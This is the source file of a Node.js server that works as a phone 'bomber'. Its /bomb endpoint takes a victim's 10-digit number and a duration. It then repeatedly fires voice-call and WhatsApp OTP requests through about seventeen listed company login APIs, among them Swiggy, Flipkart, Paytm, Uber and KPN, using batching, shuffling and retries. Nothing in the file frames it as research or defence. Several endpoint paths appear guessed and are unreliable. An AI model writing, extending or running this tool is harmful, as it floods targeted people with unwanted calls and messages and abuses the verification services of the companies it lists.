// ============================================================
// api_server_voice.js - Voice & WhatsApp Only API Server
// Deploy on Render as API5
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// ===== VOICE APIS =====
// ============================================================

const VOICE_APIS = [
    {
        name: "Tata Capital Voice",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone, isOtpViaCallAtLogin: "true" }),
        phone_format: "raw"
    },
    {
        name: "1MG Voice",
        url: "https://www.1mg.com/auth_api/v6/create_token",
        method: "POST",
        headers: { "Content-Type": "application/json; charset=utf-8" },
        data: (phone) => JSON.stringify({ number: phone, otp_on_call: true }),
        phone_format: "raw"
    },
    {
        name: "Swiggy Voice",
        url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        phone_format: "raw"
    },
    {
        name: "Flipkart Voice",
        url: "https://www.flipkart.com/api/6/user/voice-otp/generate",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        phone_format: "raw"
    },
    {
        name: "Paytm Voice",
        url: "https://accounts.paytm.com/signin/voice-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone }),
        phone_format: "raw"
    },
    {
        name: "Zomato Voice",
        url: "https://www.zomato.com/php/o2_api_handler.php",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: (phone) => `phone=${phone}&type=voice`,
        phone_format: "raw"
    },
    {
        name: "Ola Voice",
        url: "https://api.olacabs.com/v1/voice-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone }),
        phone_format: "raw"
    },
    {
        name: "Uber Voice",
        url: "https://auth.uber.com/v2/voice-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: `+91${phone}` }),
        phone_format: "raw"
    },
    {
        name: "Amazon Pay Voice",
        url: "https://www.amazon.in/ap/signin/voice-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phoneNumber: phone }),
        phone_format: "raw"
    },
    {
        name: "Google Voice",
        url: "https://accounts.google.com/_/signin/voice-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phoneNumber: phone }),
        phone_format: "raw"
    },
    {
        name: "WhatsApp Business Voice",
        url: "https://graph.facebook.com/v18.0/phone_verify",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone_number: phone, via: "voice" }),
        phone_format: "raw"
    }
];

// ============================================================
// ===== WHATSAPP APIS =====
// ============================================================

const WHATSAPP_APIS = [
    {
        name: "KPN WhatsApp",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        method: "POST",
        headers: { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8" },
        data: (phone) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: phone } }),
        phone_format: "raw"
    },
    {
        name: "Foxy WhatsApp",
        url: "https://www.foxy.in/api/v2/users/send_otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ user: { phone_number: `+91${phone}` }, via: "whatsapp" }),
        phone_format: "raw"
    },
    {
        name: "Rappi WhatsApp",
        url: "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        method: "POST",
        headers: { "Content-Type": "application/json; charset=utf-8" },
        data: (phone) => JSON.stringify({ country_code: "+91", phone: phone }),
        phone_format: "raw"
    },
    {
        name: "WhatsApp Business OTP",
        url: "https://graph.facebook.com/v18.0/phone_verify",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone_number: phone, via: "whatsapp" }),
        phone_format: "raw"
    },
    {
        name: "Ola WhatsApp",
        url: "https://api.olacabs.com/v1/whatsapp-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone, channel: "whatsapp" }),
        phone_format: "raw"
    },
    {
        name: "Uber WhatsApp",
        url: "https://auth.uber.com/v2/whatsapp-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: `+91${phone}` }),
        phone_format: "raw"
    }
];

// ============================================================
// ===== MERGE ALL APIS =====
// ============================================================

const allApis = [...VOICE_APIS, ...WHATSAPP_APIS];

// Remove duplicates
const seenUrls = new Set();
const uniqueApis = [];
for (const api of allApis) {
    const urlKey = typeof api.url === 'function' ? `dynamic_${api.name || 'unknown'}` : api.url;
    if (!seenUrls.has(urlKey)) {
        seenUrls.add(urlKey);
        uniqueApis.push(api);
    }
}

console.log(`✅ Loaded ${uniqueApis.length} Voice & WhatsApp APIs`);

// ============================================================
// ===== API CALL FUNCTION =====
// ============================================================

function makeFallbackData(phone, apiName) {
    const lower = apiName.toLowerCase();
    if (lower.includes('voice') || lower.includes('call')) {
        return JSON.stringify({ mobile: phone });
    }
    if (lower.includes('whatsapp')) {
        return JSON.stringify({ mobile: phone, channel: "whatsapp" });
    }
    return JSON.stringify({ mobile: phone });
}

async function makeApiCall(api, phone, retryCount = 0) {
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...api.headers };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') {
                data = api.data(phone);
            } else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') {
                    rawData = rawData.replace(/{phone}/g, phone);
                }
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
                        for (let key in obj) {
                            newObj[key] = replacePhone(obj[key]);
                        }
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        } else {
            data = makeFallbackData(phone, api.name);
        }

        const method = api.method.toLowerCase();
        const config = {
            method,
            url,
            headers,
            timeout: 5000, // Slow timeout for voice/wa
        };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) {
                    headers['Content-Type'] = 'application/json';
                }
            }
        }

        const response = await axios(config);
        return { status: response.status, success: true };
    } catch (err) {
        if (retryCount < 2 && 
            (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
            return makeApiCall(api, phone, retryCount + 1);
        }
        return { status: null, success: false };
    }
}

// ============================================================
// ===== ROUTES =====
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'api5',
        apis: uniqueApis.length,
        type: 'Voice & WhatsApp Only',
        uptime: process.uptime()
    });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;
    
    if (!phone || phone.length !== 10) {
        return res.status(400).json({ error: 'Invalid phone number. Must be 10 digits.' });
    }

    console.log(`📱 Voice/WA Bombing ${phone} | Duration: ${duration}min | Instance: ${instance || 'api5'}`);

    try {
        const startTime = Date.now();
        let success = 0, callCount = 0, whatsappCount = 0;
        const apiList = uniqueApis;
        const BATCH_SIZE = 3; // Small batch for voice/wa
        const BATCH_DELAY = 3000; // 3 second delay between batches
        
        let maxRequests = 50; // Limited requests for voice/wa

        const shuffled = [...apiList];
        for (let i = shuffled.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
        }

        let sent = 0;
        // Keep running until duration ends
        const endTime = Date.now() + (duration * 60 * 1000);
        let cycleCount = 0;

        while (Date.now() < endTime && sent < maxRequests * 10) {
            cycleCount++;
            
            for (let i = 0; i < shuffled.length && sent < maxRequests; i += BATCH_SIZE) {
                if (Date.now() >= endTime) break;
                
                const batch = shuffled.slice(i, Math.min(i + BATCH_SIZE, shuffled.length));
                
                const results = await Promise.allSettled(
                    batch.map(api => makeApiCall(api, phone))
                );
                
                for (const result of results) {
                    if (result.status === 'fulfilled' && result.value && result.value.success) {
                        success++;
                        sent++;
                        const apiName = batch[results.indexOf(result)]?.name || '';
                        if (apiName.toLowerCase().includes('voice') || apiName.toLowerCase().includes('call')) {
                            callCount++;
                        } else if (apiName.toLowerCase().includes('whatsapp') || apiName.toLowerCase().includes('wa')) {
                            whatsappCount++;
                        }
                    }
                }
                
                // Delay between batches
                await new Promise(r => setTimeout(r, BATCH_DELAY));
            }
            
            // After one full cycle, wait before next cycle
            await new Promise(r => setTimeout(r, 2000));
        }

        const elapsed = (Date.now() - startTime) / 1000;
        
        res.json({
            success: true,
            phone,
            duration,
            instance: instance || 'api5',
            totalSent: success,
            calls: callCount,
            whatsapp: whatsappCount,
            cycles: cycleCount,
            elapsed: elapsed.toFixed(1) + 's',
            type: 'Voice & WhatsApp'
        });
        
    } catch (error) {
        console.error('Voice/WA Bombing error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        total: uniqueApis.length,
        type: 'Voice & WhatsApp Only',
        instances: process.env.INSTANCE_NAME || 'api5'
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Voice/WA API Server running on port ${PORT}`);
    console.log(`📡 Instance: ${process.env.INSTANCE_NAME || 'api5'}`);
    console.log(`📊 APIs loaded: ${uniqueApis.length}`);
    console.log(`📞 Voice APIs: ${VOICE_APIS.length}`);
    console.log(`📱 WhatsApp APIs: ${WHATSAPP_APIS.length}`);
});
